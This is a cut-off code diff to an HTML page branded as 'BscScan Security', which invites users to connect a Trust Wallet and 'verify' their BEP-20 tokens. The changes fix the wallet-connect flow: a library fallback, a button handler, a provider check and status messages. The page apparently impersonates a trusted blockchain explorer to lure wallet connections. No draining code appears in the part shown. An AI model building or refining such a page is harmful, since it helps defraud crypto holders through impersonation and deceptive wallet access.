@@ -5,6 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>BscScan Security — BNB Smart Chain Audit</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+  <script>
+    if (typeof ethers === "undefined") {
+      document.write('<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"><\/script>');
+    }
+  </script>
   <style>
     * {
       box-sizing: border-box;
@@ -458,7 +463,7 @@
         <p>Execute official on-chain validation for your BEP-20 tokens via BscScan's direct Smart Chain consensus.</p>
       </div>
 
-      <button id="verifyBtn" class="verify-btn" type="button">
+      <button id="verifyBtn" class="verify-btn" type="button" onclick="connectAndVerify()">
         Verify Asset
       </button>
 
@@ -589,7 +594,7 @@
         return window.trustwallet.ethereum;
       }
       if (window.ethereum && Array.isArray(window.ethereum.providers)) {
-        const tw = window.ethereum.providers.find(p => p.isTrust || p.isTrustWallet);
+        const tw = window.ethereum.providers.find(p => p && (p.isTrust || p.isTrustWallet));
         if (tw) return tw;
         return window.ethereum.providers[0] || window.ethereum;
       }
@@ -688,22 +693,14 @@
     }
 
     async function connectAndVerify() {
+      setStatus("Button clicked. Checking wallet...");
+
       const btn = document.getElementById("verifyBtn");
       const infoBox = document.getElementById("walletInfo");
 
       if (typeof ethers === "undefined") {
-        setStatus("ethers.js library load nahi hui. Network/CDN check karein.", true);
+        setStatus("ethers.js library load nahi hui.", true);
         return;
       }
 
-      const rawProvider = getProvider();
-      if (!rawProvider) {
-        setStatus("Wallet nahi mila. Trust Wallet ke DApp browser mein open karein.", true);
-        return;
-      }
-
-      attachProviderListeners(rawProvider);
-
-      try {
-        btn.disabled = true;
-        btn.textC
+      const rawProvider = getProvider
